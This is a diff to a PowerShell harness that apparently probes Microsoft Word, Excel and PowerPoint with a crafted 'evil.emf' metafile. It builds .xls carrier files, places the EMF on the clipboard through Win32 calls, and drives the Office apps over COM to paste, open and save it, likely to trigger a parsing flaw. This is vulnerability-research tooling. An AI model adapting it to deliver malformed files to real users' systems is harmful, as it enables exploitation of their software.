@@ -147,4 +147,45 @@ try{
 }catch{ Log ("doc build fail: " + $_.Exception.Message) }
 $openDocBin={ param($p) try{ $w=[Runtime.InteropServices.Marshal]::GetActiveObject('Word.Application'); $d=$w.Documents.Open('C:\emfwork\evil.doc'); Start-Sleep 5; try{ $d.InlineShapes.Item(1).ConvertToShape()|Out-Null; Log '  conv2shape ok' }catch{ Log ('  conv2shape: ' + $_.Exception.Message) }; Start-Sleep 8; $d.Close(0); $w.Quit() }catch{ Log ("  com: " + $_.Exception.Message) } }
 Probe "$root\WINWORD.EXE" @('/n','/q') $openDocBin 'word_evildoc'
+# Excel probes
+Add-Type -TypeDefinition @'
+using System;
+using System.Runtime.InteropServices;
+public class FX7 {
+  [DllImport("user32.dll", SetLastError=true)] public static extern bool OpenClipboard(IntPtr h);
+  [DllImport("user32.dll")] public static extern bool EmptyClipboard();
+  [DllImport("user32.dll")] public static extern bool CloseClipboard();
+  [DllImport("user32.dll", SetLastError=true)] public static extern IntPtr SetClipboardData(uint fmt, IntPtr h);
+  [DllImport("gdi32.dll", CharSet=CharSet.Unicode, SetLastError=true)] public static extern IntPtr GetEnhMetaFileW(string f);
+}
+'@
+function SetClipEmf($emf){
+  $h=[FX7]::GetEnhMetaFileW($emf)
+  if($h -eq [IntPtr]::Zero){ Log "clip getemf FAIL"; return $false }
+  [FX7]::OpenClipboard([IntPtr]::Zero)|Out-Null; [FX7]::EmptyClipboard()|Out-Null
+  [FX7]::SetClipboardData(14,$h)|Out-Null; [FX7]::CloseClipboard()|Out-Null
+  return $true
+}
+# build evil .xls carrier (picture inside Escher store) without cdb
+try{
+  $xl=New-Object -ComObject Excel.Application
+  $xl.Visible=$false; $xl.DisplayAlerts=0
+  $wb=$xl.Workbooks.Add()
+  $wb.Worksheets.Item(1).Shapes.AddPicture('C:\emfwork\evil.emf',$false,$true,10,10,200,200)|Out-Null
+  $wb.SaveAs('C:\emfwork\evil_pict.xls',56); $wb.Close($false)
+  $wb2=$xl.Workbooks.Add()
+  $wb2.Worksheets.Item(1).Shapes.AddPicture('C:\emfwork\good.emf',$false,$true,10,10,200,200)|Out-Null
+  $wb2.SaveAs('C:\emfwork\good_pict.xls',56); $wb2.Close($false)
+  $xl.Quit()
+  Log ('xls carriers ok evil=' + (Get-Item 'C:\emfwork\evil_pict.xls').Length + ' good=' + (Get-Item 'C:\emfwork\good_pict.xls').Length)
+}catch{ Log ("xls build fail: " + $_.Exception.Message) }
+$xlsPaste={ param($p) if(SetClipEmf 'C:\emfwork\evil.emf'){ try{ $x=[Runtime.InteropServices.Marshal]::GetActiveObject('Excel.Application'); $wb=$x.Workbooks.Add(); $x.ActiveSheet.Paste(); Start-Sleep 8; Log ("  pasted shapes=" + $wb.Worksheets.Item(1).Shapes.Count); $wb.Saved=$true }catch{ Log ("  com: " + $_.Exception.Message) } } }
+Probe "$root\EXCEL.EXE" @('/x') $xlsPaste 'xls_paste'
+$xlsAddSave={ param($p) try{ $x=[Runtime.InteropServices.Marshal]::GetActiveObject('Excel.Application'); $wb=$x.Workbooks.Add(); $wb.Worksheets.Item(1).Shapes.AddPicture('C:\emfwork\evil.emf',$false,$true,10,10,200,200)|Out-Null; Start-Sleep 3; try{ $wb.SaveAs('C:\emfwork\out_evil.xlsx',51); Log '  saveas xlsx ok' }catch{ Log ('  saveas xlsx: ' + $_.Exception.Message) }; Start-Sleep 3; try{ $wb.SaveAs('C:\emfwork\out_evil.xls',56); Log '  saveas xls ok' }catch{ Log ('  saveas xls: ' + $_.Exception.Message) }; $wb.Saved=$true }catch{ Log ("  com: " + $_.Exception.Message) } }
+Probe "$root\EXCEL.EXE" @('/x') $xlsAddSave 'xls_addsave'
+$xlsOpen={ param($p) try{ $x=[Runtime.InteropServices.Marshal]::GetActiveObject('Excel.Application'); $wb=$x.Workbooks.Open('C:\emfwork\evil_pict.xls'); Start-Sleep 8; Log ("  opened xls shapes=" + $wb.Worksheets.Item(1).Shapes.Count); try{ $wb.Worksheets.Item(1).Shapes.Item(1).Copy()|Out-Null; $x.ActiveSheet.Paste()|Out-Null; Start-Sleep 5; Log '  shape copy+paste ok' }catch{ Log ('  shapecopy: ' + $_.Exception.Message) }; $wb.Saved=$true }catch{ Log ("  com: " + $_.Exception.Message) } }
+Probe "$root\EXCEL.EXE" @('/x') $xlsOpen 'xls_openpict'
+# PPT clipboard paste of EMF (slide = drawing surface)
+$pptPaste={ param($p) if(SetClipEmf 'C:\emfwork\evil.emf'){ try{ $a=[Runtime.InteropServices.Marshal]::GetActiveObject('PowerPoint.Application'); $pres=$a.Presentations.Add(0); $pres.Slides.Add(1,12)|Out-Null; Start-Sleep 2; try{ $pres.Slides.Item(1).Shapes.Paste()|Out-Null; Log '  ppt paste ok' }catch{ Log ('  ppt paste: ' + $_.Exception.Message) }; Start-Sleep 8; $pres.Saved=-1 }catch{ Log ("  com: " + $_.Exception.Message) } } }
+Probe "$root\POWERPNT.EXE" @('/w') $pptPaste 'ppt_paste'
 Log '=== done ==='
